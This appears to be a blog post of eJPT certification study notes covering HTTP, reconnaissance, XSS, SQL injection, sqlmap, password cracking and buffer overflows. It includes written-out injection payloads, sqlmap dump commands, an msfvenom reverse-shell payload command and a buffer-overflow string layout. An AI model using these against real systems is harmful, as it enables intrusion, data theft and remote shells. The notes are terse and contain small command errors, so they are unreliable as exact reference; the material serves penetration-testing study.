---
title: EJPT Notes
date: 2021-09-17
categories:
  - Notes
tags:
  - EJPT
  - Notes
excerpt_separator: <!--more-->
toc: true
toc_sticky: true
---

<h2 id="web_applications">Web Applications</h2>
<h3>HTTP</h3>
<p>
<ul>
  <li>HTTP works on top of TCP Protocol</li>
  <li>SYN-SYNACK-ACK(GET /html)-HTML Response-Close Connection</li>
  <li>HEADER: Header-Value</li>
  <li>User-Agent - Client software that's issuing the request - reveals OS/sysVersion</li>
  <li>Accept - Document type expected in the response</li>
  <li>Content-type - lets the client know hot to interpret the body of the msg.</li>
  <li>Cookie with http-only attreibute prevents Cookie stealing via XSS</li>
</ul>
</p>
<code>nc $IP 80</code>
<h3>HTTPS</h3>
<code>openssl s_client -connect target.site:443</code>
<ul>
<li>nc doesnt do https - use openssl instead </li>
<li></li>
</ul>

<p>httprint</p>
<code>httprint -P0 -h $IP -s $signature file</code>
<p> </p>

<h3>Verbs</h3>
<p>GET - used for requesting resource</p>
<p>POST - submit HTML form data</p>
<p>HEAD - similar to get as it just asks headers</p>
<p>PUT - upload - when using PUT you need to know the size of the CONTENT = CONTENT LENGHT to do this we can use wc with -m</p>
<code>PUT /payload.php HTTP/1.0<br>Content-type: text/html<br>Content-length: 20 <br><br><?php phpinfo(); ?>
</code>
<p>Delete - remove files</p>
<p>options - query for enabled HTTP verbs</p>

<h2 id="opensource-int">Open Source Intelligence</h2>
<h3>Dnsdumpster.com</h3>

<h2>subdomain enum</h2>
<p>*.example.com</p>
<p>sublist3r</p>
<p>virustotal</p>

<h2>footprinting/scanning</h2>
<h3>mapping network</h3>
<h3>os finger printing</h3>
<p>https://lcamtuf.coredump.cx/p0f3/</p>
<p>nmap</p>
<p>masscan</p>
<p>fping</p>
<code># fping -a -g 10.142.111.0/24 2> /dev/null
</code>
<code>nmap -sn -n 10.142.111.*</code>

<h2>vuln assessment</h2>

<h3>sql</h3>
<p>https://gist.github.com/hofmannsven/9164408</p>

<h2>google dorks</h2>
<p>site: - include only results on a given hostname</p>
<p>intitle: - filters according to the title of a page</p>
<p>inurl - filters according to url of a resource</p>
<p>filetype: -filters file extensions - pdf xls</p>
<p>and, or, &, |</p>
<p>- - filter out keywords</p>

<h2>XSS</h2>
<p>javascript can access cookies if they do not have the httpONly flag enabled = xss can be used to steal cookies</p>
<code>script alert(document.cookie) /script </code>

<h2>sqli</h2>

<code>SELECT name, description FROM products WHERE id=9;</code>
<p>queries the db for name and description of a record in products table where id=9</p>
<code>SELECT -column list- FROM -table- WHERE -condition-</code>

<h3>union</h3>
<code>-SELECT statement- UNION -other SELECT statement-;</code>
<code>SELECT name, description FROM Products WHERE ID='3' UNION SELECT username, password FROM accounts</code>
<p>the previous query shows name and description as columns with ID=3 entry and then the data with in accounts-username and password after it</p>
<p>comments= # or -- (2 dashes with space</p>
<h3>dynamic queries</h3>
<p>asks for user input</p>
<code>$id = $_GET['id'];</code>
<code>"SELECT name, desc FROM productes WHERE ID='$id';";</code>
<code>'a OR 'a'='a</code>
<p>this becomes</p>
<code>SELECT name, desc FROM products WHERE ID='' OR 'a'='a';</code>

<code>' UNION SELECT user, pass FROM Accounts WHERE 'a'='a</code>

<h3>finding injection points</h3>
<p>test all user supplied input</p>
<p>GET, POST, HTTP Headers - User-Agent, Cookie, Accept</p>

<code>select substring(user() , 1, 1) = 'r';</code>
<code>' or substr (user(), 1, 1)= 'a</code>
<code>' or substr (user(), 1, 1)= 'b</code>
<p>used to bruteforce user by asking whats the username letter by letter - db will answer 1 or 0</p>

<code>' UNION SELECT user(); -- -';</code>
<p>third dash is to prevent browsers from deleting the trailing space</p>

<h4>first step - determine how many fields</h4>
<code>' UNION SELECT null;-- -</code>
<code>' UNION SELECT null, null;-- -</code>
<p>add null until we get no error </p>
<h4>check which field is in the web app</h4>
<code>' UNION SELECT 'asd', 'asd';-- -</code>
<p>field will be determined on where 'asd' will appear on the webapp</p>
<p>you can also check the source code for this</p>

<h4>try to query user()</h4>
<code>' UNION SELECT user(), 'asd';-- -</code>

<h2>SQLmap</h2>

<code>sqlmap -u *URL* -p *injection parameter* [options]></code>
<code>sqlmap -u "http://test.site/view.php?id=1" -p id --technique=U</code>

<p>for post parameter testing</p>
<code>sqlmap -u *URL* --data=*POST STRING* -p *PARAMETER* [options]</code>
<code>sqlmap -u "http://test.site/view.php?id=1" --tables</code>
<p>to retreive db name</p>
<code>sqlmap -u "http://test.site/view.php?id=1" --tables</code>
<p>to retreive tables</p>
<code>sqlmap -u "http://test.site/view.php?id=1" --current-db *dbname* -columns</code>
<code>sqlmap -u "http://test.site/view.php?id=1" --current-db *dbname* --dump</code>

<li>db</li>
<li>tables</li>
<li>columns</li>

<code>sqlmap -u "http://test.site/view.php?id=1" -D dbname -T tablename -C contentofcolumntodump --dump</code>
<p>to retrieve contents of columns</p>

<p>sometimes you dont need the '</p>
<p>id=1 OR 1=1</p>

<h2>backdoor</h2>

<p>win</p>
<p>s4u persistence -msfconsole</p>

<h2>password attacks</h2>

<h3>jtr</h3>
<p>bruteforce</p>
<code>unshadow passwd shadow > result</code>
<p>dictionary</p>
<code>john -wordlist=file.txt filestocrack</code>
<p>rainbow tables</p>
<p>ophcrack</p>

<h2>BOF</h2>

<p>main goal is to overflow buffer space to overwrite EIP(Extended Instruction Pointer</p>

<p>Steps for BOF</p>
<li>Spiking - Finding vulnerable part of the program</li>
<li>Fuzzing - Sending characters to the vulnerable part of the program to break it</li>
<li>Finding Offset - This is where the program crashes</li>
<li>Overwrite the EIP using the Offset found</li>
<li>Find right module</li>
<li>Shellcode</li>

<h3>Tools</h3>
<p>Immunity Debugger</p>
<p>generic_send_tcp</p>

<h2>Spiking</h2>
<p>readelf -s "program"</p>
<code>
  s_readline();
  s_string("TRUN ");
  s_string_variable("0");
</code>

<p>metasploit module for pattern</p>
<code>pattern_create.rb -l "bytes"</code>
<code>pattern_offset -l "bytes" -q "what data is in EIP HEX"</code>
<p>Bad Char checker</p>
<p>https://github.com/cytopia/badchars</p>
<p>Look at hexdump check for missing characters</p>
<p>finding module</p>
<code>https://github.com/corelan/mona</code>
<code>nasm_shell.rb</code>
<code>msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT EXITFUNC=thread -f c -a x86 -b "badcharacters"</code>

<code>shellcode= "A" * 2002 + "\xaf\x11\x50\x62 - this address is from nasm_shell.rb JMP ESP" + "\x90" * 32 + overflowfrommsfvenom</code>